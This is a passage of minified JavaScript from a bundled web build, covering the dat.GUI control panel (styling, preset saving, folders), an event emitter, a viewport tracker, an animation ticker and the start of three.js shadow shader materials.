e=this;this.backgroundElement.style.display="block",this.domElement.style.display="block",this.domElement.style.opacity=0,this.domElement.style.webkitTransform="scale(1.1)",this.layout(),Ul.defer((function(){e.backgroundElement.style.opacity=1,e.domElement.style.opacity=1,e.domElement.style.webkitTransform="scale(1)"}))}},{key:"hide",value:function(){var e=this,t=function t(){e.domElement.style.display="none",e.backgroundElement.style.display="none",sh.unbind(e.domElement,"webkitTransitionEnd",t),sh.unbind(e.domElement,"transitionend",t),sh.unbind(e.domElement,"oTransitionEnd",t)};sh.bind(this.domElement,"webkitTransitionEnd",t),sh.bind(this.domElement,"transitionend",t),sh.bind(this.domElement,"oTransitionEnd",t),this.backgroundElement.style.opacity=0,this.domElement.style.opacity=0,this.domElement.style.webkitTransform="scale(1.1)"}},{key:"layout",value:function(){this.domElement.style.left=window.innerWidth/2-sh.getWidth(this.domElement)/2+"px",this.domElement.style.top=window.innerHeight/2-sh.getHeight(this.domElement)/2+"px"}}]),e}();wh(function(e){if(e&&"undefined"!=typeof window){var t=document.createElement("style");return t.setAttribute("type","text/css"),t.innerHTML=e,document.head.appendChild(t),e}}(".dg ul{list-style:none;margin:0;padding:0;width:100%;clear:both}.dg.ac{position:fixed;top:0;left:0;right:0;height:0;z-index:0}.dg:not(.ac) .main{overflow:hidden}.dg.main{-webkit-transition:opacity .1s linear;-o-transition:opacity .1s linear;-moz-transition:opacity .1s linear;transition:opacity .1s linear}.dg.main.taller-than-window{overflow-y:auto}.dg.main.taller-than-window .close-button{opacity:1;margin-top:-1px;border-top:1px solid #2c2c2c}.dg.main ul.closed .close-button{opacity:1 !important}.dg.main:hover .close-button,.dg.main .close-button.drag{opacity:1}.dg.main .close-button{-webkit-transition:opacity .1s linear;-o-transition:opacity .1s linear;-moz-transition:opacity .1s linear;transition:opacity .1s linear;border:0;line-height:19px;height:20px;cursor:pointer;text-align:center;background-color:#000}.dg.main .close-button.close-top{position:relative}.dg.main .close-button.close-bottom{position:absolute}.dg.main .close-button:hover{background-color:#111}.dg.a{float:right;margin-right:15px;overflow-y:visible}.dg.a.has-save>ul.close-top{margin-top:0}.dg.a.has-save>ul.close-bottom{margin-top:27px}.dg.a.has-save>ul.closed{margin-top:0}.dg.a .save-row{top:0;z-index:1002}.dg.a .save-row.close-top{position:relative}.dg.a .save-row.close-bottom{position:fixed}.dg li{-webkit-transition:height .1s ease-out;-o-transition:height .1s ease-out;-moz-transition:height .1s ease-out;transition:height .1s ease-out;-webkit-transition:overflow .1s linear;-o-transition:overflow .1s linear;-moz-transition:overflow .1s linear;transition:overflow .1s linear}.dg li:not(.folder){cursor:auto;height:27px;line-height:27px;padding:0 4px 0 5px}.dg li.folder{padding:0;border-left:4px solid rgba(0,0,0,0)}.dg li.title{cursor:pointer;margin-left:-4px}.dg .closed li:not(.title),.dg .closed ul li,.dg .closed ul li>*{height:0;overflow:hidden;border:0}.dg .cr{clear:both;padding-left:3px;height:27px;overflow:hidden}.dg .property-name{cursor:default;float:left;clear:left;width:40%;overflow:hidden;text-overflow:ellipsis}.dg .c{float:left;width:60%;position:relative}.dg .c input[type=text]{border:0;margin-top:4px;padding:3px;width:100%;float:right}.dg .has-slider input[type=text]{width:30%;margin-left:0}.dg .slider{float:left;width:66%;margin-left:-5px;margin-right:0;height:19px;margin-top:4px}.dg .slider-fg{height:100%}.dg .c input[type=checkbox]{margin-top:7px}.dg .c select{margin-top:5px}.dg .cr.function,.dg .cr.function .property-name,.dg .cr.function *,.dg .cr.boolean,.dg .cr.boolean *{cursor:pointer}.dg .cr.color{overflow:visible}.dg .selector{display:none;position:absolute;margin-left:-9px;margin-top:23px;z-index:10}.dg .c:hover .selector,.dg .selector.drag{display:block}.dg li.save-row{padding:0}.dg li.save-row .button{display:inline-block;padding:0px 6px}.dg.dialogue{background-color:#222;width:460px;padding:15px;font-size:13px;line-height:15px}#dg-new-constructor{padding:10px;color:#222;font-family:Monaco, monospace;font-size:10px;border:0;resize:none;box-shadow:inset 1px 1px 1px #888;word-wrap:break-word;margin:12px 0;display:block;width:440px;overflow-y:scroll;height:100px;position:relative}#dg-local-explain{display:none;font-size:11px;line-height:17px;border-radius:3px;background-color:#333;padding:8px;margin-top:10px}#dg-local-explain code{font-size:10px}#dat-gui-save-locally{display:none}.dg{color:#eee;font:11px 'Lucida Grande', sans-serif;text-shadow:0 -1px 0 #111}.dg.main::-webkit-scrollbar{width:5px;background:#1a1a1a}.dg.main::-webkit-scrollbar-corner{height:0;display:none}.dg.main::-webkit-scrollbar-thumb{border-radius:5px;background:#676767}.dg li:not(.folder){background:#1a1a1a;border-bottom:1px solid #2c2c2c}.dg li.save-row{line-height:25px;background:#dad5cb;border:0}.dg li.save-row select{margin-left:5px;width:108px}.dg li.save-row .button{margin-left:5px;margin-top:1px;border-radius:2px;font-size:9px;line-height:7px;padding:4px 4px 5px 4px;background:#c5bdad;color:#fff;text-shadow:0 1px 0 #b0a58f;box-shadow:0 -1px 0 #b0a58f;cursor:pointer}.dg li.save-row .button.gears{background:#c5bdad url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAANCAYAAAB/9ZQ7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAQJJREFUeNpiYKAU/P//PwGIC/ApCABiBSAW+I8AClAcgKxQ4T9hoMAEUrxx2QSGN6+egDX+/vWT4e7N82AMYoPAx/evwWoYoSYbACX2s7KxCxzcsezDh3evFoDEBYTEEqycggWAzA9AuUSQQgeYPa9fPv6/YWm/Acx5IPb7ty/fw+QZblw67vDs8R0YHyQhgObx+yAJkBqmG5dPPDh1aPOGR/eugW0G4vlIoTIfyFcA+QekhhHJhPdQxbiAIguMBTQZrPD7108M6roWYDFQiIAAv6Aow/1bFwXgis+f2LUAynwoIaNcz8XNx3Dl7MEJUDGQpx9gtQ8YCueB+D26OECAAQDadt7e46D42QAAAABJRU5ErkJggg==) 2px 1px no-repeat;height:7px;width:8px}.dg li.save-row .button:hover{background-color:#bab19e;box-shadow:0 -1px 0 #b0a58f}.dg li.folder{border-bottom:0}.dg li.title{padding-left:16px;background:#000 url(data:image/gif;base64,R0lGODlhBQAFAJEAAP////Pz8////////yH5BAEAAAIALAAAAAAFAAUAAAIIlI+hKgFxoCgAOw==) 6px 10px no-repeat;cursor:pointer;border-bottom:1px solid rgba(255,255,255,0.2)}.dg .closed li.title{background-image:url(data:image/gif;base64,R0lGODlhBQAFAJEAAP////Pz8////////yH5BAEAAAIALAAAAAAFAAUAAAIIlGIWqMCbWAEAOw==)}.dg .cr.boolean{border-left:3px solid #806787}.dg .cr.color{border-left:3px solid}.dg .cr.function{border-left:3px solid #e61d5f}.dg .cr.number{border-left:3px solid #2FA1D6}.dg .cr.number input[type=text]{color:#2FA1D6}.dg .cr.string{border-left:3px solid #1ed36f}.dg .cr.string input[type=text]{color:#1ed36f}.dg .cr.function:hover,.dg .cr.boolean:hover{background:#111}.dg .c input[type=text]{background:#303030;outline:none}.dg .c input[type=text]:hover{background:#3c3c3c}.dg .c input[type=text]:focus{background:#494949;color:#fff}.dg .c .slider{background:#303030;cursor:ew-resize}.dg .c .slider-fg{background:#2FA1D6;max-width:100%}.dg .c .slider:hover{background:#3c3c3c}.dg .c .slider:hover .slider-fg{background:#44abda}\n"));var Th=function(){try{return!!window.localStorage}catch(e){return!1}}(),Eh=void 0,Ah=!0,Ch=void 0,Ph=!1,Lh=[],Rh=function e(t){var i=this,n=t||{};this.domElement=document.createElement("div"),this.__ul=document.createElement("ul"),this.domElement.appendChild(this.__ul),sh.addClass(this.domElement,"dg"),this.__folders={},this.__controllers=[],this.__rememberedObjects=[],this.__rememberedObjectIndecesToControllers=[],this.__listening=[],n=Ul.defaults(n,{closeOnTop:!1,autoPlace:!0,width:e.DEFAULT_WIDTH}),n=Ul.defaults(n,{resizable:n.autoPlace,hideable:n.autoPlace}),Ul.isUndefined(n.load)?n.load={preset:"Default"}:n.preset&&(n.load.preset=n.preset),Ul.isUndefined(n.parent)&&n.hideable&&Lh.push(this),n.resizable=Ul.isUndefined(n.parent)&&n.resizable,n.autoPlace&&Ul.isUndefined(n.scrollable)&&(n.scrollable=!0);var r,o=Th&&"true"===localStorage.getItem(zh(this,"isLocal")),a=void 0,s=void 0;if(Object.defineProperties(this,{parent:{get:function(){return n.parent}},scrollable:{get:function(){return n.scrollable}},autoPlace:{get:function(){return n.autoPlace}},closeOnTop:{get:function(){return n.closeOnTop}},preset:{get:function(){return i.parent?i.getRoot().preset:n.load.preset},set:function(e){i.parent?i.getRoot().preset=e:n.load.preset=e,function(e){for(var t=0;t<e.__preset_select.length;t++)e.__preset_select[t].value===e.preset&&(e.__preset_select.selectedIndex=t)}(this),i.revert()}},width:{get:function(){return n.width},set:function(e){n.width=e,Vh(i,e)}},name:{get:function(){return n.name},set:function(e){n.name=e,s&&(s.innerHTML=n.name)}},closed:{get:function(){return n.closed},set:function(t){n.closed=t,n.closed?sh.addClass(i.__ul,e.CLASS_CLOSED):sh.removeClass(i.__ul,e.CLASS_CLOSED),this.onResize(),i.__closeButton&&(i.__closeButton.innerHTML=t?e.TEXT_OPEN:e.TEXT_CLOSED)}},load:{get:function(){return n.load}},useLocalStorage:{get:function(){return o},set:function(e){Th&&(o=e,e?sh.bind(window,"unload",a):sh.unbind(window,"unload",a),localStorage.setItem(zh(i,"isLocal"),e))}}}),Ul.isUndefined(n.parent)){if(n.closed=!1,sh.addClass(this.domElement,e.CLASS_MAIN),sh.makeSelectable(this.domElement,!1),Th&&o){i.useLocalStorage=!0;var c=localStorage.getItem(zh(this,"gui"));c&&(n.load=JSON.parse(c))}this.__closeButton=document.createElement("div"),this.__closeButton.innerHTML=e.TEXT_CLOSED,sh.addClass(this.__closeButton,e.CLASS_CLOSE_BUTTON),n.closeOnTop?(sh.addClass(this.__closeButton,e.CLASS_CLOSE_TOP),this.domElement.insertBefore(this.__closeButton,this.domElement.childNodes[0])):(sh.addClass(this.__closeButton,e.CLASS_CLOSE_BOTTOM),this.domElement.appendChild(this.__closeButton)),sh.bind(this.__closeButton,"click",(function(){i.closed=!i.closed}))}else{void 0===n.closed&&(n.closed=!0);var l=document.createTextNode(n.name);sh.addClass(l,"controller-name"),s=kh(i,l);sh.addClass(this.__ul,e.CLASS_CLOSED),sh.addClass(s,"title"),sh.bind(s,"click",(function(e){return e.preventDefault(),i.closed=!i.closed,!1})),n.closed||(this.closed=!1)}n.autoPlace&&(Ul.isUndefined(n.parent)&&(Ah&&(Ch=document.createElement("div"),sh.addClass(Ch,"dg"),sh.addClass(Ch,e.CLASS_AUTO_PLACE_CONTAINER),document.body.appendChild(Ch),Ah=!1),Ch.appendChild(this.domElement),sh.addClass(this.domElement,e.CLASS_AUTO_PLACE)),this.parent||Vh(i,n.width)),this.__resizeHandler=function(){i.onResizeDebounced()},sh.bind(window,"resize",this.__resizeHandler),sh.bind(this.__ul,"webkitTransitionEnd",this.__resizeHandler),sh.bind(this.__ul,"transitionend",this.__resizeHandler),sh.bind(this.__ul,"oTransitionEnd",this.__resizeHandler),this.onResize(),n.resizable&&Uh(this),a=function(){Th&&"true"===localStorage.getItem(zh(i,"isLocal"))&&localStorage.setItem(zh(i,"gui"),JSON.stringify(i.getSaveObject()))},this.saveToLocalStorageIfPossible=a,n.parent||((r=i.getRoot()).width+=1,Ul.defer((function(){r.width-=1})))};function kh(e,t,i){var n=document.createElement("li");return t&&n.appendChild(t),i?e.__ul.insertBefore(n,i):e.__ul.appendChild(n),e.onResize(),n}function Oh(e){sh.unbind(window,"resize",e.__resizeHandler),e.saveToLocalStorageIfPossible&&sh.unbind(window,"unload",e.saveToLocalStorageIfPossible)}function Ih(e,t){var i=e.__preset_select[e.__preset_select.selectedIndex];i.innerHTML=t?i.value+"*":i.value}function Bh(e,t){var i=e.getRoot(),n=i.__rememberedObjects.indexOf(t.object);if(-1!==n){var r=i.__rememberedObjectIndecesToControllers[n];if(void 0===r&&(r={},i.__rememberedObjectIndecesToControllers[n]=r),r[t.property]=t,i.load&&i.load.remembered){var o=i.load.remembered,a=void 0;if(o[e.preset])a=o[e.preset];else{if(!o.Default)return;a=o.Default}if(a[n]&&void 0!==a[n][t.property]){var s=a[n][t.property];t.initialValue=s,t.setValue(s)}}}}function Dh(e,t,i,n){if(void 0===t[i])throw new Error('Object "'+t+'" has no property "'+i+'"');var r=void 0;if(n.color)r=new gh(t,i);else{var o=[t,i].concat(n.factoryArgs);r=_h.apply(e,o)}n.before instanceof nh&&(n.before=n.before.__li),Bh(e,r),sh.addClass(r.domElement,"c");var a=document.createElement("span");sh.addClass(a,"property-name"),a.innerHTML=r.property;var s=document.createElement("div");s.appendChild(a),s.appendChild(r.domElement);var c=kh(e,s,n.before);return sh.addClass(c,Rh.CLASS_CONTROLLER_ROW),r instanceof gh?sh.addClass(c,"color"):sh.addClass(c,Yl(r.getValue())),function(e,t,i){if(i.__li=t,i.__gui=e,Ul.extend(i,{options:function(t){if(arguments.length>1){var n=i.__li.nextElementSibling;return i.remove(),Dh(e,i.object,i.property,{before:n,factoryArgs:[Ul.toArray(arguments)]})}if(Ul.isArray(t)||Ul.isObject(t)){var r=i.__li.nextElementSibling;return i.remove(),Dh(e,i.object,i.property,{before:r,factoryArgs:[t]})}},name:function(e){return i.__li.firstElementChild.firstElementChild.innerHTML=e,i},listen:function(){return i.__gui.listen(i),i},remove:function(){return i.__gui.remove(i),i}}),i instanceof mh){var n=new ph(i.object,i.property,{min:i.__min,max:i.__max,step:i.__step});Ul.each(["updateDisplay","onChange","onFinishChange","step"],(function(e){var t=i[e],r=n[e];i[e]=n[e]=function(){var e=Array.prototype.slice.call(arguments);return r.apply(n,e),t.apply(i,e)}})),sh.addClass(t,"has-slider"),i.domElement.insertBefore(n.domElement,i.domElement.firstElementChild)}else if(i instanceof ph){var r=function(t){if(Ul.isNumber(i.__min)&&Ul.isNumber(i.__max)){var n=i.__li.firstElementChild.firstElementChild.innerHTML,r=i.__gui.__listening.indexOf(i)>-1;i.remove();var o=Dh(e,i.object,i.property,{before:i.__li.nextElementSibling,factoryArgs:[i.__min,i.__max,i.__step]});return o.name(n),r&&o.listen(),o}return t};i.min=Ul.compose(r,i.min),i.max=Ul.compose(r,i.max)}else i instanceof ch?(sh.bind(t,"click",(function(){sh.fakeEvent(i.__checkbox,"click")})),sh.bind(i.__checkbox,"click",(function(e){e.stopPropagation()}))):i instanceof vh?(sh.bind(t,"click",(function(){sh.fakeEvent(i.__button,"click")})),sh.bind(t,"mouseover",(function(){sh.addClass(i.__button,"hover")})),sh.bind(t,"mouseout",(function(){sh.removeClass(i.__button,"hover")}))):i instanceof gh&&(sh.addClass(t,"color"),i.updateDisplay=Ul.compose((function(e){return t.style.borderLeftColor=i.__color.toString(),e}),i.updateDisplay),i.updateDisplay());i.setValue=Ul.compose((function(t){return e.getRoot().__preset_select&&i.isModified()&&Ih(e.getRoot(),!0),t}),i.setValue)}(e,c,r),e.__controllers.push(r),r}function zh(e,t){return document.location.href+"."+t}function Fh(e,t,i){var n=document.createElement("option");n.innerHTML=t,n.value=t,e.__preset_select.appendChild(n),i&&(e.__preset_select.selectedIndex=e.__preset_select.length-1)}function Nh(e,t){t.style.display=e.useLocalStorage?"block":"none"}function jh(e){var t=e.__save_row=document.createElement("li");sh.addClass(e.domElement,"has-save"),e.__ul.insertBefore(t,e.__ul.firstChild),sh.addClass(t,"save-row");var i=document.createElement("span");i.innerHTML="&nbsp;",sh.addClass(i,"button gears");var n=document.createElement("span");n.innerHTML="Save",sh.addClass(n,"button"),sh.addClass(n,"save");var r=document.createElement("span");r.innerHTML="New",sh.addClass(r,"button"),sh.addClass(r,"save-as");var o=document.createElement("span");o.innerHTML="Revert",sh.addClass(o,"button"),sh.addClass(o,"revert");var a=e.__preset_select=document.createElement("select");if(e.load&&e.load.remembered?Ul.each(e.load.remembered,(function(t,i){Fh(e,i,i===e.preset)})):Fh(e,"Default",!1),sh.bind(a,"change",(function(){for(var t=0;t<e.__preset_select.length;t++)e.__preset_select[t].innerHTML=e.__preset_select[t].value;e.preset=this.value})),t.appendChild(a),t.appendChild(i),t.appendChild(n),t.appendChild(r),t.appendChild(o),Th){var s=document.getElementById("dg-local-explain"),c=document.getElementById("dg-local-storage");document.getElementById("dg-save-locally").style.display="block","true"===localStorage.getItem(zh(0,"isLocal"))&&c.setAttribute("checked","checked"),Nh(e,s),sh.bind(c,"change",(function(){e.useLocalStorage=!e.useLocalStorage,Nh(e,s)}))}var l=document.getElementById("dg-new-constructor");sh.bind(l,"keydown",(function(e){!e.metaKey||67!==e.which&&67!==e.keyCode||Eh.hide()})),sh.bind(i,"click",(function(){l.innerHTML=JSON.stringify(e.getSaveObject(),void 0,2),Eh.show(),l.focus(),l.select()})),sh.bind(n,"click",(function(){e.save()})),sh.bind(r,"click",(function(){var t=prompt("Enter a new preset name.");t&&e.saveAs(t)})),sh.bind(o,"click",(function(){e.revert()}))}function Uh(e){var t=void 0;function i(i){return i.preventDefault(),e.width+=t-i.clientX,e.onResize(),t=i.clientX,!1}function n(){sh.removeClass(e.__closeButton,Rh.CLASS_DRAG),sh.unbind(window,"mousemove",i),sh.unbind(window,"mouseup",n)}function r(r){return r.preventDefault(),t=r.clientX,sh.addClass(e.__closeButton,Rh.CLASS_DRAG),sh.bind(window,"mousemove",i),sh.bind(window,"mouseup",n),!1}e.__resize_handle=document.createElement("div"),Ul.extend(e.__resize_handle.style,{width:"6px",marginLeft:"-3px",height:"200px",cursor:"ew-resize",position:"absolute"}),sh.bind(e.__resize_handle,"mousedown",r),sh.bind(e.__closeButton,"mousedown",r),e.domElement.insertBefore(e.__resize_handle,e.domElement.firstElementChild)}function Vh(e,t){e.domElement.style.width=t+"px",e.__save_row&&e.autoPlace&&(e.__save_row.style.width=t+"px"),e.__closeButton&&(e.__closeButton.style.width=t+"px")}function Hh(e,t){var i={};return Ul.each(e.__rememberedObjects,(function(n,r){var o={},a=e.__rememberedObjectIndecesToControllers[r];Ul.each(a,(function(e,i){o[i]=t?e.initialValue:e.getValue()})),i[r]=o})),i}Rh.toggleHide=function(){Ph=!Ph,Ul.each(Lh,(function(e){e.domElement.style.display=Ph?"none":""}))},Rh.CLASS_AUTO_PLACE="a",Rh.CLASS_AUTO_PLACE_CONTAINER="ac",Rh.CLASS_MAIN="main",Rh.CLASS_CONTROLLER_ROW="cr",Rh.CLASS_TOO_TALL="taller-than-window",Rh.CLASS_CLOSED="closed",Rh.CLASS_CLOSE_BUTTON="close-button",Rh.CLASS_CLOSE_TOP="close-top",Rh.CLASS_CLOSE_BOTTOM="close-bottom",Rh.CLASS_DRAG="drag",Rh.DEFAULT_WIDTH=245,Rh.TEXT_CLOSED="Close Controls",Rh.TEXT_OPEN="Open Controls",Rh._keydownHandler=function(e){"text"===document.activeElement.type||72!==e.which&&72!==e.keyCode||Rh.toggleHide()},sh.bind(window,"keydown",Rh._keydownHandler,!1),Ul.extend(Rh.prototype,{add:function(e,t){return Dh(this,e,t,{factoryArgs:Array.prototype.slice.call(arguments,2)})},addColor:function(e,t){return Dh(this,e,t,{color:!0})},remove:function(e){this.__ul.removeChild(e.__li),this.__controllers.splice(this.__controllers.indexOf(e),1);var t=this;Ul.defer((function(){t.onResize()}))},destroy:function(){if(this.parent)throw new Error("Only the root GUI should be removed with .destroy(). For subfolders, use gui.removeFolder(folder) instead.");this.autoPlace&&Ch.removeChild(this.domElement);var e=this;Ul.each(this.__folders,(function(t){e.removeFolder(t)})),sh.unbind(window,"keydown",Rh._keydownHandler,!1),Oh(this)},addFolder:function(e){if(void 0!==this.__folders[e])throw new Error('You already have a folder in this GUI by the name "'+e+'"');var t={name:e,parent:this};t.autoPlace=this.autoPlace,this.load&&this.load.folders&&this.load.folders[e]&&(t.closed=this.load.folders[e].closed,t.load=this.load.folders[e]);var i=new Rh(t);this.__folders[e]=i;var n=kh(this,i.domElement);return sh.addClass(n,"folder"),i},removeFolder:function(e){this.__ul.removeChild(e.domElement.parentElement),delete this.__folders[e.name],this.load&&this.load.folders&&this.load.folders[e.name]&&delete this.load.folders[e.name],Oh(e);var t=this;Ul.each(e.__folders,(function(t){e.removeFolder(t)})),Ul.defer((function(){t.onResize()}))},open:function(){this.closed=!1},close:function(){this.closed=!0},onResize:function(){var e=this.getRoot();if(e.scrollable){var t=sh.getOffset(e.__ul).top,i=0;Ul.each(e.__ul.childNodes,(function(t){e.autoPlace&&t===e.__save_row||(i+=sh.getHeight(t))})),window.innerHeight-t-20<i?(sh.addClass(e.domElement,Rh.CLASS_TOO_TALL),e.__ul.style.height=window.innerHeight-t-20+"px"):(sh.removeClass(e.domElement,Rh.CLASS_TOO_TALL),e.__ul.style.height="auto")}e.__resize_handle&&Ul.defer((function(){e.__resize_handle.style.height=e.__ul.offsetHeight+"px"})),e.__closeButton&&(e.__closeButton.style.width=e.width+"px")},onResizeDebounced:Ul.debounce((function(){this.onResize()}),50),remember:function(){if(Ul.isUndefined(Eh)&&((Eh=new Sh).domElement.innerHTML=xh),this.parent)throw new Error("You can only call remember on a top level GUI.");var e=this;Ul.each(Array.prototype.slice.call(arguments),(function(t){0===e.__rememberedObjects.length&&jh(e),-1===e.__rememberedObjects.indexOf(t)&&e.__rememberedObjects.push(t)})),this.autoPlace&&Vh(this,this.width)},getRoot:function(){for(var e=this;e.parent;)e=e.parent;return e},getSaveObject:function(){var e=this.load;return e.closed=this.closed,this.__rememberedObjects.length>0&&(e.preset=this.preset,e.remembered||(e.remembered={}),e.remembered[this.preset]=Hh(this)),e.folders={},Ul.each(this.__folders,(function(t,i){e.folders[i]=t.getSaveObject()})),e},save:function(){this.load.remembered||(this.load.remembered={}),this.load.remembered[this.preset]=Hh(this),Ih(this,!1),this.saveToLocalStorageIfPossible()},saveAs:function(e){this.load.remembered||(this.load.remembered={},this.load.remembered.Default=Hh(this,!0)),this.load.remembered[e]=Hh(this),this.preset=e,Fh(this,e,!0),this.saveToLocalStorageIfPossible()},revert:function(e){Ul.each(this.__controllers,(function(t){this.getRoot().load.remembered?Bh(e||this.getRoot(),t):t.setValue(t.initialValue),t.__onFinishChange&&t.__onFinishChange.call(t,t.getValue())}),this),Ul.each(this.__folders,(function(e){e.revert(e)})),e||Ih(this.getRoot(),!1)},listen:function(e){var t=0===this.__listening.length;this.__listening.push(e),t&&function e(t){0!==t.length&&Mh.call(window,(function(){e(t)}));Ul.each(t,(function(e){e.updateDisplay()}))}(this.__listening)},updateDisplay:function(){Ul.each(this.__controllers,(function(e){e.updateDisplay()})),Ul.each(this.__folders,(function(e){e.updateDisplay()}))}});var Gh=Rh;function Wh(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}var qh=function(){function e(){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.callbacks={},this.callbacks.base={}}var t,i,n;return t=e,(i=[{key:"on",value:function(e,t){var i=this;return void 0===e||""===e?(console.warn("wrong names"),!1):void 0===t?(console.warn("wrong callback"),!1):(this.resolveNames(e).forEach((function(e){var n=i.resolveName(e);i.callbacks[n.namespace]instanceof Object||(i.callbacks[n.namespace]={}),i.callbacks[n.namespace][n.value]instanceof Array||(i.callbacks[n.namespace][n.value]=[]),i.callbacks[n.namespace][n.value].push(t)})),this)}},{key:"off",value:function(e){var t=this;return void 0===e||""===e?(console.warn("wrong name"),!1):(this.resolveNames(e).forEach((function(e){var i=t.resolveName(e);if("base"!==i.namespace&&""===i.value)delete t.callbacks[i.namespace];else if("base"===i.namespace)for(var n in t.callbacks)t.callbacks[n]instanceof Object&&t.callbacks[n][i.value]instanceof Array&&(delete t.callbacks[n][i.value],0===Object.keys(t.callbacks[n]).length&&delete t.callbacks[n]);else t.callbacks[i.namespace]instanceof Object&&t.callbacks[i.namespace][i.value]instanceof Array&&(delete t.callbacks[i.namespace][i.value],0===Object.keys(t.callbacks[i.namespace]).length&&delete t.callbacks[i.namespace])})),this)}},{key:"trigger",value:function(e,t){if(void 0===e||""===e)return console.warn("wrong name"),!1;var i=this,n=null,r=null,o=t instanceof Array?t:[],a=this.resolveNames(e);if("base"===(a=this.resolveName(a[0])).namespace)for(var s in i.callbacks)i.callbacks[s]instanceof Object&&i.callbacks[s][a.value]instanceof Array&&i.callbacks[s][a.value].forEach((function(e){r=e.apply(i,o),void 0===n&&(n=r)}));else if(this.callbacks[a.namespace]instanceof Object){if(""===a.value)return console.warn("wrong name"),this;i.callbacks[a.namespace][a.value].forEach((function(e){r=e.apply(i,o),void 0===n&&(n=r)}))}return n}},{key:"resolveNames",value:function(e){var t=e;return t=(t=(t=t.replace(/[^a-zA-Z0-9 ,/.]/g,"")).replace(/[,/]+/g," ")).split(" ")}},{key:"resolveName",value:function(e){var t={},i=e.split(".");return t.original=e,t.value=i[0],t.namespace="base",i.length>1&&""!==i[1]&&(t.namespace=i[1]),t}}])&&Wh(t.prototype,i),n&&Wh(t,n),e}();function Xh(e){return(Xh="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function Yh(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function Zh(e){return(Zh=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function Qh(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function $h(e,t){return($h=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}var Jh=function(e){function t(){var e;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(e=function(e,t){return!t||"object"!==Xh(t)&&"function"!=typeof t?Qh(e):t}(this,Zh(t).call(this))).viewport={},e.$sizeViewport=document.createElement("div"),e.$sizeViewport.style.width="100vw",e.$sizeViewport.style.height="100vh",e.$sizeViewport.style.position="absolute",e.$sizeViewport.style.top=0,e.$sizeViewport.style.left=0,e.$sizeViewport.style.pointerEvents="none",e.resize=e.resize.bind(Qh(e)),window.addEventListener("resize",e.resize),e.resize(),e}var i,n,r;return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&$h(e,t)}(t,e),i=t,(n=[{key:"resize",value:function(){document.body.appendChild(this.$sizeViewport),this.viewport.width=this.$sizeViewport.offsetWidth,this.viewport.height=this.$sizeViewport.offsetHeight,document.body.removeChild(this.$sizeViewport),this.width=window.innerWidth,this.height=window.innerHeight,this.trigger("resize")}}])&&Yh(i.prototype,n),r&&Yh(i,r),t}(qh);function Kh(e){return(Kh="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}function eu(e,t){for(var i=0;i<t.length;i++){var n=t[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}function tu(e){return(tu=Object.setPrototypeOf?Object.getPrototypeOf:function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function iu(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function nu(e,t){return(nu=Object.setPrototypeOf||function(e,t){return e.__proto__=t,e})(e,t)}var ru=function(e){function t(){var e;return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),(e=function(e,t){return!t||"object"!==Kh(t)&&"function"!=typeof t?iu(e):t}(this,tu(t).call(this))).start=Date.now(),e.current=e.start,e.elapsed=0,e.delta=16,e.tick=e.tick.bind(iu(e)),e.tick(),e}var i,n,r;return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),t&&nu(e,t)}(t,e),i=t,(n=[{key:"tick",value:function(){this.ticker=window.requestAnimationFrame(this.tick);var e=Date.now();this.delta=e-this.current,this.elapsed=e-this.start,this.current=e,this.delta>60&&(this.delta=60),this.trigger("tick")}},{key:"stop",value:function(){window.cancelAnimationFrame(this.ticker)}}])&&eu(i.prototype,n),r&&eu(i,r),t}(qh),ou=function(){return new Vt({wireframe:!1,transparent:!0,uniforms:{tShadow:{value:null},uShadowColor:{value:null},uAlpha:{value:null}},vertexShader:"#define GLSLIFY 1\nvarying vec2 vUv;\n\nvoid main()\n{\n    vUv = uv;\n    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);\n}\n",fragmentShader:"#define GLSLIFY 1\nuniform sampler2D tShadow;\nuniform vec3 uShadowColor;\nuniform float uAlpha;\n\nvarying vec2 vUv;\n\nvoid main()\n{\n    float shadowAlpha = 1.0 - texture2D(tShadow, vUv).r;\n    shadowAlpha *= uAlpha;\n\n    gl_FragColor = vec4(uShadowColor, shadowAlpha);\n}\n"})};function au(e,t){var i=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),i.push.apply(i,n)}return i}function su(e,t,i){return t in e?Object.defineProperty(e,t,{value:i,enumerable:!0,configurable:!0,writable:!0}):e[t]=i,e}var cu=function(){return new Vt({wireframe:!1,transparent:!1,uniforms:function(e){for(var t=1;t<arguments.length;t++){var 